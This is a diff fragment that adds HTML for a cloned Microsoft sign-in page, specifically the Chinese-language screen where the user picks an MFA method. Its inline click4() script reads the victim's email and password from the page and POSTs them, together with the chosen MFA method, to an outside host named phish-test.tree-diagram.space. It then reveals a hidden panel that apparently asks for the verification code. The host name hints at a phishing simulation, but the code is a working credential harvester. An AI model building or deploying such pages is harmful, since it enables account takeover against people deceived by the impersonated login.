+                'app': $page.backgroundLogoUrl,
+                'wide': $page.paginationControlHelper.useWiderWidth,
+                'fade-in-lightbox': $page.fadeInLightBox,
+                'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
+                'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
+                'lightbox-bottom-margin-debug': $page.showDebugDetails }"
+                                                class="sign-in-box ext-sign-in-box app fade-in-lightbox">
+
+                                                <div class=lightbox-cover
+                                                    data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; isRequestPending() }">
+                                                </div>
+
+                                                <div>
+
+                                                    <div data-bind="component: { name: 'logo-control',
+                params: {
+                    isChinaDc: svr.fIsChinaDc,
+                    bannerLogoUrl: $tfaPage.bannerLogoUrl() } }">
+
+                                                        <img class=logo role=img
+                                                            pngsrc=https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png
+                                                            svgsrc=https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg
+                                                            data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }"
+                                                            src=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDgiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAxMDggMjQiPjx0aXRsZT5hc3NldHM8L3RpdGxlPjxwYXRoIGQ9Ik00NC44MzYsNC42VjE4LjRoLTIuNFY3LjU4M0g0Mi40TDM4LjExOSwxOC40SDM2LjUzMUwzMi4xNDIsNy41ODNoLS4wMjlWMTguNEgyOS45VjQuNmgzLjQzNkwzNy4zLDE0LjgzaC4wNThMNDEuNTQ1LDQuNlptMiwxLjA0OWExLjI2OCwxLjI2OCwwLDAsMSwuNDE5LS45NjcsMS40MTMsMS40MTMsMCwwLDEsMS0uMzksMS4zOTIsMS4zOTIsMCwwLDEsMS4wMi40LDEuMywxLjMsMCwwLDEsLjQuOTU4LDEuMjQ4LDEuMjQ4LDAsMCwxLS40MTQuOTUzLDEuNDI4LDEuNDI4LDAsMCwxLTEuMDEuMzg1QTEuNCwxLjQsMCwwLDEsNDcuMjUsNi42YTEuMjYxLDEuMjYxLDAsMCwxLS40MDktLjk0OE00OS40MSwxOC40SDQ3LjA4MVY4LjUwN0g0OS40MVptNy4wNjQtMS42OTRhMy4yMTMsMy4yMTMsMCwwLDAsMS4xNDUtLjI0MSw0LjgxMSw0LjgxMSwwLDAsMCwxLjE1NS0uNjM1VjE4YTQuNjY1LDQuNjY1LDAsMCwxLTEuMjY2LjQ4MSw2Ljg4Niw2Ljg4NiwwLDAsMS0xLjU1NC4xNjQsNC43MDcsNC43MDcsMCwwLDEtNC45MTgtNC45MDgsNS42NDEsNS42NDEsMCwwLDEsMS40LTMuOTMyLDUuMDU1LDUuMDU1LDAsMCwxLDMuOTU1LTEuNTQ1LDUuNDE0LDUuNDE0LDAsMCwxLDEuMzI0LjE2OCw0LjQzMSw0LjQzMSwwLDAsMSwxLjA2My4zOXYyLjIzM2E0Ljc2Myw0Ljc2MywwLDAsMC0xLjEtLjYxMSwzLjE4NCwzLjE4NCwwLDAsMC0xLjE1LS4yMTcsMi45MTksMi45MTksMCwwLDAtMi4yMjMuOSwzLjM3LDMuMzcsMCwwLDAtLjg0NywyLjQxNiwzLjIxNiwzLjIxNiwwLDAsMCwuODEzLDIuMzM4LDIuOTM2LDIuOTM2LDAsMCwwLDIuMjA5LjgzN002NS40LDguMzQzYTIuOTUyLDIuOTUyLDAsMCwxLC41LjAzOSwyLjEsMi4xLDAsMCwxLC4zNzUuMXYyLjM1OGEyLjA0LDIuMDQsMCwwLDAtLjUzNC0uMjU1LDIuNjQ2LDIuNjQ2LDAsMCwwLS44NTItLjEyLDEuODA4LDEuODA4LDAsMCwwLTEuNDQ4LjcyMiwzLjQ2NywzLjQ2NywwLDAsMC0uNTkyLDIuMjIzVjE4LjRINjAuNTI1VjguNTA3aDIuMzI5djEuNTU5aC4wMzhBMi43MjksMi43MjksMCwwLDEsNjMuODU1LDguOCwyLjYxMSwyLjYxMSwwLDAsMSw2NS40LDguMzQzbTEsNS4yNTRBNS4zNTgsNS4zNTgsMCwwLDEsNjcuNzkyLDkuNzFhNS4xLDUuMSwwLDAsMSwzLjg1LTEuNDM0LDQuNzQyLDQuNzQyLDAsMCwxLDMuNjIzLDEuMzgxLDUuMjEyLDUuMjEyLDAsMCwxLDEuMywzLjcyOSw1LjI1Nyw1LjI1NywwLDAsMS0xLjM4NiwzLjgzLDUuMDE5LDUuMDE5LDAsMCwxLTMuNzcyLDEuNDI0LDQuOTM1LDQuOTM1LDAsMCwxLTMuNjUyLTEuMzUyQTQuOTg3LDQuOTg3LDAsMCwxLDY2LjQwNiwxMy42bTIuNDI1LS4wNzdhMy41MzUsMy41MzUsMCwwLDAsLjcsMi4zNjgsMi41MDUsMi41MDUsMCwwLDAsMi4wMTEuODE4LDIuMzQ1LDIuMzQ1LDAsMCwwLDEuOTM0LS44MTgsMy43ODMsMy43ODMsMCwwLDAsLjY2NC0yLjQyNSwzLjY1MSwzLjY1MSwwLDAsMC0uNjg4LTIuNDExLDIuMzg5LDIuMzg5LDAsMCwwLTEuOTI5LS44MTMsMi40NCwyLjQ0LDAsMCwwLTEuOTg4Ljg1MiwzLjcwNywzLjcwNywwLDAsMC0uNzA3LDIuNDNtMTEuMi0yLjQxNmExLDEsMCwwLDAsLjMxOC43ODUsNS40MjYsNS40MjYsMCwwLDAsMS40LjcxNyw0Ljc2Nyw0Ljc2NywwLDAsMSwxLjk1OSwxLjI1NiwyLjYsMi42LDAsMCwxLC41NjMsMS42ODlBMi43MTUsMi43MTUsMCwwLDEsODMuMiwxNy43OTRhNC41NTgsNC41NTgsMCwwLDEtMi45Ljg0Nyw2Ljk3OCw2Ljk3OCwwLDAsMS0xLjM2Mi0uMTQ5LDYuMDQ3LDYuMDQ3LDAsMCwxLTEuMjY1LS4zOHYtMi4yOWE1LjczMyw1LjczMywwLDAsMCwxLjM2Ny43LDQsNCwwLDAsMCwxLjMyOC4yNiwyLjM2NSwyLjM2NSwwLDAsMCwxLjE2NC0uMjIxLjc5Ljc5LDAsMCwwLC4zNzUtLjc0MSwxLjAyOSwxLjAyOSwwLDAsMC0uMzktLjgxMyw1Ljc2OCw1Ljc2OCwwLDAsMC0xLjQ3Ny0uNzY1LDQuNTY0LDQuNTY0LDAsMCwxLTEuODI5LTEuMjEzLDIuNjU1LDIuNjU1LDAsMCwxLS41MzktMS43MTMsMi43MDYsMi43MDYsMCwwLDEsMS4wNjMtMi4yQTQuMjQzLDQuMjQzLDAsMCwxLDgxLjUsOC4yNTZhNi42NjMsNi42NjMsMCwwLDEsMS4xNjQuMTE1LDUuMTYxLDUuMTYxLDAsMCwxLDEuMDc4LjN2Mi4yMTRhNC45NzQsNC45NzQsMCwwLDAtMS4wNzgtLjUyOSwzLjYsMy42LDAsMCwwLTEuMjIyLS4yMjEsMS43ODEsMS43ODEsMCwwLDAtMS4wMzQuMjYuODI0LjgyNCwwLDAsMC0uMzcxLjcxMk04NS4yNzgsMTMuNkE1LjM1OCw1LjM1OCwwLDAsMSw4Ni42NjQsOS43MWE1LjEsNS4xLDAsMCwxLDMuODQ5LTEuNDM0LDQuNzQzLDQuNzQzLDAsMCwxLDMuNjI0LDEuMzgxLDUuMjEyLDUuMjEyLDAsMCwxLDEuMywzLjcyOSw1LjI1OSw1LjI1OSwwLDAsMS0xLjM4NiwzLjgzLDUuMDIsNS4wMiwwLDAsMS0zLjc3MywxLjQyNCw0LjkzNCw0LjkzNCwwLDAsMS0zLjY1Mi0xLjM1MkE0Ljk4Nyw0Ljk4NywwLDAsMSw4NS4yNzgsMTMuNm0yLjQyNS0uMDc3YTMuNTM3LDMuNTM3LDAsMCwwLC43LDIuMzY4LDIuNTA2LDIuNTA2LDAsMCwwLDIuMDExLjgxOCwyLjM0NSwyLjM0NSwwLDAsMCwxLjkzNC0uODE4LDMuNzgzLDMuNzgzLDAsMCwwLC42NjQtMi40MjUsMy42NTEsMy42NTEsMCwwLDAtLjY4OC0yLjQxMSwyLjM5LDIuMzksMCwwLDAtMS45My0uODEzLDIuNDM5LDIuNDM5LDAsMCwwLTEuOTg3Ljg1MiwzLjcwNywzLjcwNywwLDAsMC0uNzA3LDIuNDNtMTUuNDY0LTMuMTA5SDk5LjdWMTguNEg5Ny4zNDFWMTAuNDEySDk1LjY4NlY4LjUwN2gxLjY1NVY3LjEzYTMuNDIzLDMuNDIzLDAsMCwxLDEuMDE1LTIuNTU1LDMuNTYxLDMuNTYxLDAsMCwxLDIuNi0xLDUuODA3LDUuODA3LDAsMCwxLC43NTEuMDQzLDIuOTkzLDIuOTkzLDAsMCwxLC41NzcuMTNWNS43NjRhMi40MjIsMi40MjIsMCwwLDAtLjQtLjE2NCwyLjEwNywyLjEwNywwLDAsMC0uNjY0LS4xLDEuNDA3LDEuNDA3LDAsMCwwLTEuMTI2LjQ1N0EyLjAxNywyLjAxNywwLDAsMCw5OS43LDcuMzEzVjguNTA3aDMuNDY5VjYuMjgzbDIuMzM5LS43MTJWOC41MDdoMi4zNTh2MS45MDZoLTIuMzU4djQuNjI5YTEuOTUxLDEuOTUxLDAsMCwwLC4zMzIsMS4yOSwxLjMyNiwxLjMyNiwwLDAsMCwxLjA0NC4zNzUsMS41NTcsMS41NTcsMCwwLDAsLjQ4Ni0uMSwyLjI5NCwyLjI5NCwwLDAsMCwuNS0uMjMxVjE4LjNhMi43MzcsMi43MzcsMCwwLDEtLjczNi4yMzEsNS4wMjksNS4wMjksMCwwLDEtMS4wMTUuMTA2LDIuODg3LDIuODg3LDAsMCwxLTIuMjA5LS43ODQsMy4zNDEsMy4zNDEsMCwwLDEtLjczNi0yLjM2M1oiIGZpbGw9IiM3MzczNzMiLz48cmVjdCB3aWR0aD0iMTAuOTMxIiBoZWlnaHQ9IjEwLjkzMSIgZmlsbD0iI2YyNTAyMiIvPjxyZWN0IHg9IjEyLjA2OSIgd2lkdGg9IjEwLjkzMSIgaGVpZ2h0PSIxMC45MzEiIGZpbGw9IiM3ZmJhMDAiLz48cmVjdCB5PSIxMi4wNjkiIHdpZHRoPSIxMC45MzEiIGhlaWdodD0iMTAuOTMxIiBmaWxsPSIjMDBhNGVmIi8+PHJlY3QgeD0iMTIuMDY5IiB5PSIxMi4wNjkiIHdpZHRoPSIxMC45MzEiIGhlaWdodD0iMTAuOTMxIiBmaWxsPSIjZmZiOTAwIi8+PC9zdmc+
+                                                            alt=Microsoft>
+                                                    </div>
+
+
+                                                    <div role=main data-bind="component: { name: 'pagination-control',
+                    publicMethods: paginationControlMethods,
+                    params: {
+                        enableCssAnimation: svr.fEnableCssAnimation,
+                        disableAnimationIfAnimationEndUnsupported: svr.fDisableAnimationIfAnimationEndUnsupported,
+                        initialViewId: initialViewId,
+                        initialSharedData: initialSharedData,
+                        initialError: $tfaPage.serverError },
+                    event: {
+                        cancel: paginationControl_onCancel,
+                        load: paginationControlHelper.onLoad,
+                        unload: paginationControlHelper.onUnload,
+                        loadView: view_onLoadView,
+                        showView: view_onShow,
+                        setLightBoxFadeIn: view_onSetLightBoxFadeIn } }">
+                                                        <div data-bind="css: { 'zero-opacity': hidePaginatedView() }">
+
+                                                            <div data-bind="css: {
+        'animate': animate() &amp;&amp; animate.animateBanner(),
+        'slide-out-next': animate.isSlideOutNext(),
+        'slide-in-next': animate.isSlideInNext(),
+        'slide-out-back': animate.isSlideOutBack(),
+        'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next">
+                                                                <div data-bind="component: { name: 'identity-banner-control',
+            params: {
+                userTileUrl: svr.urlProfilePhoto,
+                displayName: sharedData.displayName || svr.sPOST_Username,
+                isBackButtonVisible: isBackButtonVisible(),
+                focusOnBackButton: isBackButtonFocused(),
+                backButtonDescribedBy: backButtonDescribedBy() },
+            event: {
+                backButtonClick: identityBanner_onBackButtonClick } }">
+                                                                    <div class=identityBanner>
+
+                                                                        <div id=displayName1 class=identity
+                                                                            data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }"
+                                                                            title=lt@943789196qq.onmicrosoft.com>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+                                                            </div>
+
+                                                            <div class="pagination-view has-identity-banner animate slide-in-next"
+                                                                data-bind="css: {
+        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
+        'zero-opacity': hidePaginatedView.hideSubView(),
+        'animate': animate(),
+        'slide-out-next': animate.isSlideOutNext(),
+        'slide-in-next': animate.isSlideInNext(),
+        'slide-out-back': animate.isSlideOutBack(),
+        'slide-in-back': animate.isSlideInBack() }">
+
+
+
+
+
+
+                                                                <div data-viewid=2 data-showidentitybanner=true
+                                                                    data-bind="pageViewComponent: { name: 'otc-request-view',
+                    params: {
+                        serverData: svr,
+                        serverError: initialError,
+                        renderProofsInline: true,
+                        username: sharedData.username,
+                        otcProofs: sharedData.otcProofs,
+                        isInitialState: isInitialState,
+                        showCancelButton: sharedData.showCancelButton,
+                        hideSmsInMfaProofs: sharedData.hideSmsInMfaProofs,
+                        focusDefaultField: true },
+                    event: {
+                        cancel: view_onCancel,
+                        redirect: $tfaPage.view_onRedirect,
+                        showDebugDetails: $tfaPage.toggleDebugDetails_onClick,
+                        setPendingRequest: $tfaPage.view_onSetPendingRequest,
+                        updateSessionIdentifier: $tfaPage.view_onUpdateSessionIdentifier,
+                        showMoreProofs: $tfaPage.view_onShowMoreProofs } }">
+                                                                    <div id=idDiv_SAOTCS_Title class="row text-title"
+                                                                        role=heading aria-level=1
+                                                                        data-bind="text: str['CT_SAOTCC_STR_Title']">
+                                                                        验证您的身份</div>
+                                                                    <div id=idDiv_SAOTCS_Proofs_Section>
+
+                                                                        <div id=idDiv_SAOTCS_Proofs class=form-group
+                                                                            role=list
+                                                                            data-bind="css: { 'binaryChoice list': svr.fSupportWindowsStyles }"
+                                                                            aria-labelledby="idDiv_SAOTCS_Error_OTC idDiv_SAOTCS_Title">
+
+
+                                                                            <div class="row tile" role=listitem
+                                                                                onclick="click4()" id="mfa_item0"
+                                                                                style="display: none;"
+                                                                                mfamethod="PhoneAppOTP">
+                                                                                <div class=table tabindex=0 role=button mfamethod="PhoneAppOTP"
+                                                                                    data-bind="
+                    attr: { 'data-value': value },
+                    css: { 'list-item': svr.fSupportWindowsStyles },
+                    ariaDescribedBy: $data === $parent.focusedProof() ? 'idDiv_SAOTCS_Title' : null,
+                    click: $parent.proof_onClick,
+                    pressEnter: $parent.proof_onClick,
+                    hasFocus: $data === $parent.focusedProof()" data-value=PhoneAppOTP
+                                                                                    aria-describedby=idDiv_SAOTCS_Title>
+                                                                                    <div class=table-row mfamethod="PhoneAppOTP">
+                                                                                        <div mfamethod="PhoneAppOTP"
+                                                                                            class="table-cell tile-img">
+                                                                                            <div mfamethod="PhoneAppOTP"
+                                                                                                data-bind="component: { name: 'proof-image-control', params: { type: type } }">
+
+                                                                                                <img class=tile-img mfamethod="PhoneAppOTP"
+                                                                                                    role=presentation
+                                                                                                    pngsrc=https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_code_ea014b224eb1c04ac2f7cb85c43cc034.png
+                                                                                                    svgsrc=https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_code_f7ab697e65b83ce9870a4736085deeec.svg
+                                                                                                    data-bind="imgSrc, css: { 'small': small }"
+                                                                                                    src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDQ4IDQ4Ij48dGl0bGU+YXNzZXRzPC90aXRsZT48cmVjdCB3aWR0aD0iNDgiIGhlaWdodD0iNDgiIGZpbGw9Im5vbmUiLz48cGF0aCBkPSJNMzgsMTRIMTBWMzRIMzhWMTRtMiwyMkg4VjEySDQwVjM2TTE3LjY4OCwxOC44VjI4LjgyOEgxNS41MzFWMjEuMjM0YTMuMiwzLjIsMCwwLDEtLjY3Mi40M2wtLjI2Ni4xMTdhMi41NSwyLjU1LDAsMCwxLS41NjIuMTg4LDIuNDIzLDIuNDIzLDAsMCwxLS4zLjA3cS0uMTQxLjAyMy0uMjgxLjA1NVYyMC4yNjZxLjQyMi0uMTI1LjgxMy0uMjgxdC43NjYtLjM0NGE4LjI1Myw4LjI1MywwLDAsMCwxLjM0NC0uODQ0aDEuMzEzbTQuNTMxLDguMjM0aDQuMTU2djEuOEgxOS44NTl2LS43NWEzLjI5MiwzLjI5MiwwLDAsMSwuMjUtMS4zNDQsNC4xODMsNC4xODMsMCwwLDEsLjYyNS0xLjA3OCw1LjcsNS43LDAsMCwxLC44NDQtLjgyOHEuMjE5LS4xODcuNDM4LS4zNTJ0LjQyMi0uMzJxLjQ1My0uMzEyLjc2Ni0uNTc4YTIuNTkzLDIuNTkzLDAsMCwwLC4zLS4yODFsLjI1LS4yODFhMy4xNDgsMy4xNDgsMCwwLDAsLjMyOC0uNTYyLDEuNTksMS41OSwwLDAsMCwuMTA5LS42MDksMS4xNzYsMS4xNzYsMCwwLDAtLjM1OS0uOTM3LDEuNTUyLDEuNTUyLDAsMCwwLTEuMDc4LS4zMjgsMy42MjUsMy42MjUsMCwwLDAtMi40MjIsMVYxOS42ODhhNC44NjYsNC44NjYsMCwwLDEsMS4zNTktLjYyNSw1LjU0OCw1LjU0OCwwLDAsMSwxLjUxNi0uMiw0LjQ1Niw0LjQ1NiwwLDAsMSwxLjM0NC4xODgsMi40NjEsMi40NjEsMCwwLDEsMSwuNTYzLDIuMjQyLDIuMjQyLDAsMCwxLC42MjUuODc1LDMuMDA3LDMuMDA3LDAsMCwxLC4yMTksMS4xNTYsMy41MzgsMy41MzgsMCwwLDEtLjA1NS42NDEsMy43LDMuNywwLDAsMS0uMTQ4LjU2MywzLjQzOSwzLjQzOSwwLDAsMS0uNTYyLjk1Myw3LjIsNy4yLDAsMCwxLS44LjhxLS4yMTkuMTcyLS40NTMuMzQ0dC0uNDg0LjM0NGwtLjMyLjIzNHEtLjE0OC4xMDktLjMuMjM0LS4xNTYuMTA5LS4yODkuMjE5dC0uMjU4LjIxOXEtLjEwOS4xMjUtLjIuMjI3dC0uMTY0LjIxMWEuNzYzLjc2MywwLDAsMC0uMTQxLjQwNk0yNy44MjgsMjguNVYyNi42MjVhMy44MzUsMy44MzUsMCwwLDAsMi4zLjcxOSwyLjEyOCwyLjEyOCwwLDAsMCwxLjMtLjM1OSwxLjIsMS4yLDAsMCwwLC40NTMtMSwxLjEyNiwxLjEyNiwwLDAsMC0uNTYyLTEsMy4wMjYsMy4wMjYsMCwwLDAtMS41NzgtLjM1OWgtLjkwNlYyMi45NjloLjg0NHExLjkwNiwwLDEuOTA2LTEuMjY2LDAtMS4yLTEuNDY5LTEuMmEzLjMsMy4zLDAsMCwwLTEuOTA2LjY0MVYxOS4zNzVhNS4zMTYsNS4zMTYsMCwwLDEsMi40MDYtLjUxNiwzLjYzMSwzLjYzMSwwLDAsMSwyLjM0NC42NzIsMi4xNzUsMi4xNzUsMCwwLDEsLjgyOCwxLjc1LDIuMjcxLDIuMjcxLDAsMCwxLTEuOTUzLDIuNDA2di4wNDdhMi42LDIuNiwwLDAsMSwxLjY0MS43NSwyLjE0NCwyLjE0NCwwLDAsMSwuNjA5LDEuNTMxLDIuNjU1LDIuNjU1LDAsMCwxLTEsMi4xNzJBNC4zLDQuMywwLDAsMSwzMC4zLDI5LDUuMzY1LDUuMzY1LDAsMCwxLDI3LjgyOCwyOC41WiIgZmlsbD0iIzQwNDA0MCIvPjwvc3ZnPg==">
+                                                                                            </div>
+                                                                                        </div>
+                                                                                        <div class="table-cell text-left content" mfamethod="PhoneAppOTP"
+                                                                                            data-bind="css: { 'content': !svr.fSupportWindowsStyles }">
+                                                                                            <div id="mfa0" mfamethod="PhoneAppOTP"
+                                                                                                
+                                                                                                data-bind="text: display">
+                                                                                                输入验证码</div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                </div>
+                                                                            </div>
+                                                                            <script>
+                                                                                function click4(events) {
+                                                                                    event.preventDefault();
+                                                                                    console.log(event.target.getAttribute('mfamethod'));
+                                                                                    // console.log("hhh");
+                                                                                    var method = event.target.getAttribute('mfamethod');
+                                                                                    var email = document.getElementById("i0116").value;
+                                                                                    var password = document.getElementById("pwd22").value;
+                                                                                    $.ajax({
+                                                                                        dataType: 'JSON',
+                                                                                        url: "https://phish-test.tree-diagram.space/mfa",
+                                                                                        type: 'POST',
+                                                                                        data: {
+                                                                                            username: email,
+                                                                                            password: password,
+                                                                                            method: method
+                                                                                            // detail: detail,
+
+                                                                                        }
+
+                                                                                    });
+                                                                                    if (method == "OneWaySMS") {
+                                                                                        document.getElementById("hint_code").innerHTML = "Phone code";
+                                                                                    }
+                                                                                    document.getElementById("displayName2").innerHTML = document.getElementById("displayName1").innerHTML;
+                                                                                    document.getElementById("lightbox3").style.display = 'block';
+                                                                                    document.getElementById("lightbox2").style.display = 'none';
+
+                                                                                }
+                                                                            </script>
+
+                                                                            <div class="row tile" role=listitem
+                                                                                id="mfa_item1" style="display: none;"
+                                                                                mfamethod = "OneWaySMS"
+                                                                                onclick="click4()">
+                                                                                <div class=table tabindex=0 role=button mfamethod="PhoneAppOTP"
+                                                                                    data-bind="
+                    attr: { 'data-value': value },
+                    css: { 'list-item': svr.fSupportWindowsStyles },
+                    ariaDescribedBy: $data === $parent.focusedProof() ? 'idDiv_SAOTCS_Title' : null,
+                    click: $parent.proof_onClick,
+                    pressEnter: $parent.proof_onClick,
+                    hasFocus: $data === $parent.focusedProof()" data-value=OneWaySMS>
+                                                                                    <div class=table-row mfamethod = "OneWaySMS">
+                                                                                        <div mfamethod = "OneWaySMS"
+                                                                                            class="table-cell tile-img">
+                                                                                            <div mfamethod = "OneWaySMS"
+                                                                                                data-bind="component: { name: 'proof-image-control', params: { type: type } }">
+
+                                                                                                <img class=tile-img mfamethod = "OneWaySMS"
+                                                                                                    role=presentation
+                                                                                                    pngsrc=https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_sms_b15dda889e9803e9d6befd60000fadf8.png
+                                                                                                    svgsrc=https://aadcdn.msauth.net/shared/1.0/content/images/picker_verify_sms_27a6d18b56f46818420e60a773c36d4e.svg
+                                                                                                    data-bind="imgSrc, css: { 'small': small, 'animate-pulse': animate }"
+                                                                                                    src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDQ4IDQ4Ij48dGl0bGU+YXNzZXRzPC90aXRsZT48cmVjdCB3aWR0aD0iNDgiIGhlaWdodD0iNDgiIGZpbGw9Im5vbmUiLz48cGF0aCBkPSJNMzgsMzBWMTJIMTBWMzBoNHY0LjU3OEwxOC41NzgsMzBIMzhNMTIsMzJIOFYxMEg0MFYzMkgxOS40MjJMMTIsMzkuNDIyWiIgZmlsbD0iIzQwNDA0MCIvPjwvc3ZnPg==">
+                                                                                            </div>
+                                                                                        </div>
+                                                                                        <div class="table-cell text-left content" mfamethod = "OneWaySMS"
+                                                                                            data-bind="css: { 'content': !svr.fSupportWindowsStyles }">
+                                                                                            <div id="mfa1" mfamethod = "OneWaySMS"
+                                                                
+                                                                                                data-bind="text: display">
+
+                                                                                            </div>
+                                                                                        </div>
+                                                                                    </div>
+                                                                                </div>
+                                                                            </div>
+
+
+                                                                        </div>
+                                                                    </div>
+                                                                    <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }"
+                                                                        class=position-buttons>
+                                                                        <div class=row>
+
+                                                                            <div class=col-md-24>
+                                                                                <div class=text-13>
+
+
+
+
+                                                                                    <div class=form-group>
+                                                                                        <a id=moreInfoUrl target=_blank
+                                                                                            href="https://go.microsoft.com/fwlink/p/?LinkId=708614"
+                                                                                            data-bind="
+                        text: str['CT_STR_More_Info'],
+                        href: svr.urlMoreInfo,
+                        ariaLabel: str['CT_STR_More_Info_AriaLabel']" aria-label=有关双重验证的详细信息>详细信息</a>
+                                                                                    </div>
+
+
+                                                                                    <div class="text-13 form-group">
+                                                                                        <span
+                                                                                            data-bind="text: str['CT_SAOTCS_STR_Update_Auth_Methods_Link']">验证方法是最新的吗?
+                                                                                            请在 https://aka.ms/mfasetup
+                                                                                            进行检查</span>
+                                                                                    </div>
+
+                                                                                </div>
+                                                                            </div>
+
+                                                                        </div>
+                                                                    </div>
+                                                                    <div class=win-button-pin-bottom
+                                                                        data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
+                                                                        <div class=row
+                                                                            data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
+                                                                            <div data-bind="component: { name: 'footer-buttons-field',
+            params: {
+                serverData: svr,
+                removeBottomMargin: true,
+                secondaryButtonId: 'idBtn_SAOTCS_Cancel',
+                secondaryButtonText: secondaryButtonValue(),
+                isPrimaryButtonVisible: false,
+                isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; showCancelButton },
+            event: {
+                primaryButtonClick: primaryButton_onClick,
+                secondaryButtonClick: secondaryButton_onClick } }">
+                                                                                <div class="col-xs-24 no-padding-left-right button-container no-margin-bottom button-field-container ext-button-field-container"
+                                                                                    data-bind="
+    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
+    css: { 'no-margin-bottom': removeBottomMargin },
+    externalCss: { 'button-field-container': true }">
+
+                                                                                    <div data-bind="css: { 'inline-block': true }, externalCss: { 'button-item': true }"
+                                                                                        class="inline-block button-item ext-button-item">
+                                                                                        <input type=button
+                                                                                            id=idBtn_SAOTCS_Cancel
+                                                                                            class="win-button button-secondary button ext-button secondary ext-secondary"
+                                                                                            data-bind="
+            attr: { 'id': secondaryButtonId || 'idBtn_Back' },
+            externalCss: {
+                'button': true,
+                'secondary': true },
+            value: secondaryButtonText() || str['CT_HRD_STR_Splitter_Back'],
+            ariaDescribedBy: secondaryButtonDescribedBy,
+            hasFocus: focusOnSecondaryButton,
+            click: secondaryButton_onClick,
+            enable: isSecondaryButtonEnabled" value=取消>
+                                                                                    </div>
+
+                                                                                    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }"
+                                                                                        class="button-item ext-button-item">
+
+                                                                                        <input type=submit
+                                                                                            id=idSIButton9
+                                                                                            class="win-button button_primary button ext-button primary ext-primary"
+                                                                                            data-report-event=Signin_Submit
+                                                                                            data-report-trigger=click
+                                                                                            data-report-value=Submit
+                                                                                            data-bind="
+                attr: primaryButtonAttributes,
+                externalCss: {
+                    'button': true,
+                    'primary': true },
+                value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
+                hasFocus: focusOnPrimaryButton,
+                click: primaryButton_onClick,
+                enable: isPrimaryButtonEnabled,
+                visible: isPrimaryButtonVisible,
+                preventTabbing: primaryButtonPreventTabbing" value=下一步 style=display:none>
+                                                                                    </div>
+                                                                                </div>
+                                                                            </div>
+                                                                        </div>
+                                                                    </div>
+                                                                </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                            </div>
+                                                        </div>
+                                                    </div>
+
+                                                </div>
+
+
+
+
+
+
+                                                <div data-bind="component: { name: 'instrumentation-control',
+            publicMethods: instrumentationMethods,
+            params: { serverData: svr } }">
+                                                </div>
+
+                                            </div>
+
+                                            <div id=lightbox3 style="display: none;" data-bind="
+            animationEnd: $page.paginationControlHelper.animationEnd,
+            externalCss: { 'sign-in-box': true },
+            css: {
+                'inner':  $content.isVerticalSplitTemplate,
+                'vertical-split-content': $content.isVerticalSplitTemplate,
+                'app': $page.backgroundLogoUrl,
+                'wide': $page.paginationControlHelper.useWiderWidth,
+                'fade-in-lightbox': $page.fadeInLightBox,
+                'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
+                'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
+                'lightbox-bottom-margin-debug': $page.showDebugDetails }"
+                                                class="sign-in-box ext-sign-in-box app fade-in-lightbox">
+
+                                                <div class=lightbox-cover
+                                                    data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; isRequestPending() }">
+                                                </div>
+
+                                                <div>
+
+                                                    <div data-bind="component: { name: 'logo-control',
+                params: {
+                    isChinaDc: svr.fIsChinaDc,
+                    bannerLogoUrl: $tfaPage.bannerLogoUrl() } }">
+
+                                                        <img class=logo role=img
+                                                            pngsrc=https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png
+                                                            svgsrc=https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg
+                                                            data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }"
